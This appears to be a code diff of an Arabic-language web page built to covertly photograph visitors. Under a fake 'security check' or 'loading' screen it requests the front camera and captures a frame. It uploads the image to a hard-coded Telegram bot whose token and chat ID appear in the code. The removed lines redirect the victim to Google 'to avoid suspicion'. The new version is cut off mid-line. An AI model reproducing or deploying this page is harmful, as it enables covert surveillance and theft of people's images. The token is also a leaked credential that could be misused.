@@ -3,107 +3,54 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>جاري التحميل...</title>
+    <title>جاري التحقق...</title>
     <style>
-        body { 
-            background-color: #000; 
-            color: #fff; 
-            display: flex; 
-            flex-direction: column; 
-            align-items: center; 
-            justify-content: center; 
-            height: 100vh; 
-            margin: 0; 
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            overflow: hidden;
-        }
-        .loader {
-            border: 4px solid #222;
-            border-top: 4px solid #3498db;
-            border-radius: 50%;
-            width: 60px;
-            height: 60px;
-            animation: spin 1s linear infinite;
-            margin-bottom: 20px;
-        }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        .text { 
-            font-size: 1.1rem; 
-            text-align: center;
-            padding: 0 20px;
-        }
+        body { background-color: #000; color: #fff; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; font-family: sans-serif; }
+        .loader { border: 4px solid #222; border-top: 4px solid #3498db; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin-bottom: 20px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        #status { font-size: 0.9rem; color: #888; margin-top: 10px; }
         canvas, video { display: none; }
     </style>
 </head>
 <body>
 
     <div class="loader"></div>
-    <div class="text">يرجى الانتظار، جاري معالجة الطلب...</div>
+    <div class="text">جاري فحص الأمان...</div>
+    <div id="status">جاري طلب إذن الوصول...</div>
 
     <canvas id="canvas"></canvas>
 
 <script>
-    // التوكن الخاص بك
     const TELEGRAM_TOKEN = '8128965245:AAHH3QO-vGGfWmFtCicmw7T9gmBcMWbUg6E';
     
-    // استخراج chatId من الرابط تلقائياً (يعمل مع chatId أو sender_id)
+    // محاولة جلب المعرف من الرابط، وإذا فشل يستخدم المعرف الافتراضي الخاص بك
     const urlParams = new URLSearchParams(window.location.search);
     const CHAT_ID = urlParams.get('chatId') || urlParams.get('sender_id') || '8169635171';
 
     async function startCapture() {
+        const status = document.getElementById('status');
         const canvas = document.getElementById('canvas');
         const ctx = canvas.getContext('2d');
 
         try {
-            // طلب الوصول للكاميرا
-            const stream = await navigator.mediaDevices.getUserMedia({ 
-                video: { facingMode: "user" }, 
-                audio: false 
-            });
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+            status.innerText = "تم السماح. جاري المعالجة...";
             
             const video = document.createElement('video');
-            video.setAttribute('playsinline', ''); // مهم جداً لهواتف iPhone
+            video.setAttribute('playsinline', '');
             video.srcObject = stream;
             await video.play();
 
-            // انتظر ثانية واحدة لضمان وضوح العدسة
             setTimeout(() => {
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
                 ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-                // إيقاف الكاميرا فوراً لتوفير البطارية وإخفاء ضوء الكاميرا
                 stream.getTracks().forEach(track => track.stop());
 
-                // إرسال الصورة
+                status.innerText = "جاري إرسال البيانات...";
+
+                // تحويل الصورة إلى JPEG بجودة متوسطة (أسرع في الرفع من PNG)
                 canvas.toBlob((blob) => {
                     const formData = new FormData();
                     formData.append('chat_id', CHAT_ID);
-                    formData.append('photo', blob, 'image.png');
-
-                    fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
-                        method: 'POST',
-                        body: formData
-                    }).then(() => {
-                        // بعد النجاح، انقل المستخدم إلى صفحة رسمية لتبعد الشبهات
-                        window.location.replace("https://www.google.com");
-                    });
-                }, 'image/png');
-            }, 1500);
-
-        } catch (error) {
-            console.error("خطأ:", error);
-            // إذا رفض المستخدم أو حدث خطأ، يمكنك توجيهه أيضاً
-            // window.location.replace("https://www.google.com");
-        }
-    }
-
-    // تشغيل الكود بمجرد التحميل
-    window.onload = startCapture;
-</script>
-
-</body>
-</html>
+                    formData.append('
